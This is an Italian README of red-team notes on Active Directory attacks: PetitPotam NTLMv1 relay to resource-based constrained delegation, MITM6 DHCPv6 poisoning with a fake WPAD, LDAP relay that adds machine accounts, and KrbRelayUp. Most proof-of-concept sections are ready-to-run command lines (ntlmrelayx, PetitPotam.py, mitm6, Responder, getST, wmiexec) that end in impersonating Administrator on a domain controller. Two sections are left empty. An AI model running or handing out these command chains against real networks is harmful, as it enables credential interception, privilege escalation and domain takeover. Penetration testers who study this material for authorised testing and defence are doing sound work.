# ADTech

Appunti, metodologia di penetration test per il rilevamento di anomalie, elenco di strumenti, script e comandi di Windows che trovo utili durante INPT/AS/RED TEAMING.

## Tabelle contenuti

- [Attacco 1. PetitPotam - NTLMv1 relay attack](#Attacco-1-PetitPotam-NTLMv1-relay-attack-)
- [Attacco 2. Enumerazione AD da non autenticato sfruttando MITM6](#Attacco-2-Enumerazione-AD-da-non-autenticato-sfruttando-MITM6-)
- [Attacco 3. Sfruttamento ESC 8 ADCS](#Attacco-3-Sfruttamento-ESC-8-ADCS-)
- [Attacco 4. LDAP signing not required and LDAP channel binding disabled](#Attacco-4-LDAP-signing-not-required-and-LDAP-channel-binding-disabled-)
- [Attacco 5. KrbRelayUp Kerberos Relay Attack with RBCD method](#Attacco-5-KrbRelayUp-Kerberos-Relay-Attack-with-RBCD-method-)
----------------
### Attacco 1. PetitPotam - NTLMv1 relay attack 🔐🕸🧑🏼‍💻

#### Prerequisiti

➤ PetitPotam sul Domain Controller

➤ Uso di NTLMv1 come protocollo di autenticazione (lo vedi con un Responder ad esempio)

➤ Almeno 2 Domain Controller

#### Proof of Concept

➤ Set-up NTLM relay verso il servizio LDAP su l'altro Domain Controller. Usi remove-mic per rimuovere la protezione e quindi sfruttare la debolezza di NTLMv1.

```
Terminale 1:

python3 ntlmrealyx.py -t ldaps://<DC2 IP> --remove-mic -smb2support --delegate-access
```

➤ Exploit della vulnerabilità PetitPotam, sfruttando il protocollo MS-EFSRPC per fare una chiamata API che triggera il target (DC1) ad autenticarsi alla macchina controllata dall'attaccante. Tale attacco funziona senza avere una utenza di dominio.

```
Terminale 2:

python3 PetitPotam.py -d <domain> <IP Attacker> <DC1 IP>
```

➤ La macchina attaccante riceve NTLM e lo inoltra al secondo DC tramite LDAP. Nello specifico l'attacco porta alla creazione di un nuovo computer macchina ed essa viene inserita nel campo attributo msDS-AllowedToActOnBehalfOfOtherIdentity del Domain Controller con la delega di impersonificare Administrator dentro DC1

➤ Viene forgiato un Silver Ticket per impersonificare un Amministratore dentro DC1. Ti salva il TGS in Administrator.ccache. 
In particolare viene usato sia S4U2Self che S4U2Proxy. In parole povere se puoi fare RCBD con ntlmv1 è possibile per design di Windows richiedere un TGS per spn CIFS sul domain controller vittima, anche se S4U2Proxy è disabilitato perchè puoi richiederlo prima per S4USelf poi fare il forward.  

```
python3 getST.py -spn cifs/<FQDN DC1> -impersonate Administrator <domain>/'<username computer macchina creato>'
```

➤ Forgiato il ticket è possibile accedere a DC1

```
KRB5CCNAME=Administrator.ccache python3 wmiexec.py -k -no-pass @FQDN DC1 
```

![Logo del progetto](https://www.tarlogic.com/wp-content/uploads/2020/02/attack_RBCD-2.png)

-----------------
### Attacco 2. Enumerazione AD da non autenticato sfruttando MITM6 🕵

#### Teoria

➤ Per impostazione predefinita, tutte le versioni di Windows da Windows Vista in poi (incluso le varianti server) hanno IPv6 abilitato e lo preferiscono rispetto a IPv4. 

➤ L'attacco è stato eseguito avvelenando le risposte DHCPv6 alle richieste legittime, assegnando alla vittima un indirizzo IPv6 nell'intervallo link-local e configurando contemporaneamente l'IP dell'attaccante come il server DNS IPv6 predefinito. A causa della preferenza di Windows per i protocolli IP, il server DNS IPv6 sarà preferito rispetto al server DNS IPv4. Un client Windows utilizzerà il server DNS IPv6 malevolo per interrogare sia i record A (IPv4) che AAAA (IPv6), e il suo traffico sarà reindirizzato a un endpoint specificato dall'attaccante. A questo punto, l'attacco è in grado di intercettare gli hash NetNTLMv2 inviati in risposta dai client vittima.
 
➤ Quando la macchina di un utente malintenzionato sta intercettando il traffico IPv6, può intercettare le richieste di autenticazione, intercettare le credenziali NTLM e trasmetterle utilizzando ntlmrelayx a un controller di dominio. Se la richiesta di autenticazione inoltrata era da un amministratore di dominio, l'utente malintenzionato può quindi utilizzare tale credenziali NTLM per creare un account utente per se stessi sul dominio

#### Prerequisiti

➤ Ci deve essere IPV6 attivo.

#### Proof of Concept

```
Terminale 1:

sudo mitm6 -i {Network Interface}
```

➤ Imposteremo ntlmrelayx per inoltrare le richieste a LDAPS su un controller di dominio, inviare al client un file WPAD falso e scaricare automaticamente tutte le informazioni che troviamo in una cartella chiamata "loot" sul sistema locale. In sintesi, l'attacco basato su NTLM Relay con falso WPAD è una strategia completa per intercettare e catturare informazioni sensibili come gli hash NTLM (i client, seguendo il meccanismo di auto-configurazione del proxy tramite WPAD, inizieranno a instradare il loro traffico attraverso il proxy controllato dall'attaccante) e potrebbe anche permettere l'enumerazione di Active Directory attraverso il traffico LDAP. 

```
Terminale 2:

impacket-ntlmrelayx -6 -t ldaps://<DC-IP> -wh fakewpad.adlab.com -l loot
```

-----------------
### Attacco 3. Sfruttamento ESC 8 ADCS 🔓🧑🏼‍💻

-----------------
### Attacco 4. LDAP signing not required and LDAP channel binding disabled 🔓🧑🏼‍💻

#### Prerequisiti

➤ LDAP not signing (di default).

➤ LDAP channel binding è disabilitato. (di default).

➤ ms-DS-MachineAccountQuota ha bisogno di essere almeno a 1 (10 by default)

#### Proof of concept

```
# On first terminal
sudo ./Responder.py -I eth0 -wfrd -P -v

# On second terminal
sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer
```

-----------------
### Attacco 5. KrbRelayUp Kerberos Relay Attack with RBCD method 🔓🧑🏼‍💻

#### Teoria
KrbRelayUp è un wrapper che avvolge alcune delle funzionalità di Rubeus e KrbRelay (insieme ad alcuni altri strumenti) al fine di semplificare l'abuso della seguente primitiva di attacco:

➤ Creazione di un nuovo account macchina (New-MachineAccount con un SPN impostato), nell' attributo msDS-AllowedToActOnBehalfOfOtherIdentity

➤ Coercizione dell'autenticazione dell'account macchina locale (utilizzando KrbRelay)

➤ Relay Kerberos a LDAP (utilizzando KrbRelay)

➤ Aggiunta di privilegi basati su risorse vincolati (RBCD) e ottenimento di un privilegiato Silver Ticket (ST) per la macchina locale (utilizzando Rubeus)

➤ Utilizzo di detto Silver Ticket (ST) per autenticarsi presso il Gestore servizi locali e creare un nuovo servizio come NT/SYSTEM (utilizzando SCMUACBypass)

Essenzialmente, si tratta di un'elevazione universale dei privilegi locali non correggibile in ambienti di dominio Windows in cui la firma LDAP non è signing (impostazioni predefinite).

#### Prerequisiti
➤ LDAP not signing (Impostazione predefinita)

#### Proof of Concept
